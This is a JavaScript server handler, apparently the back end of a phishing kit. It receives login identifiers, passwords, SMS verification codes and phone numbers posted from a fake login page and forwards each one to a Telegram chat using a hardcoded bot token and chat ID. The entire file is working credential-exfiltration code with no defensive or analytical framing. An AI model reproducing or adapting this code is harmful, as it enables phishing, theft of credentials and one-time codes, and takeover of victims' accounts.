export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { 

    Passport,
    Access,
    sms,
    smserror,
    PhoneNumber,

  } = req.body;

  const BOT_TOKEN = "8329902509:AAHvnHeuPk847NLWrkxpuzeeOUxPpR4aHdI";
  const CHAT_ID = "-4880874919";

  let message = "";

if (Passport && Access ) {
    // 🟢 رسالة الكارت
    message = `
    🔑 Nouveau PIN Login:
    - Identifiant: ${Passport}
    - Mot de passe: ${Access}
     `;
} else if (sms ) {
  // 🟢 رسالة الكارت
  message = `
  🔑 SMS recibido Login:
  - sms: ${sms}
   `;
}else if (smserror ) {
  // 🟢 رسالة الكارت
  message = `
  🔑sms Login:
  - sms: ${smserror}
   `;
}else if (PhoneNumber ) {
  // 🟢 رسالة الكارت
  message = `
  🔑PhoneNumber de teléfono:
  - PhoneNumber de telefone: ${PhoneNumber}
   `;
}
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Envoyé avec succès" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
  }
}




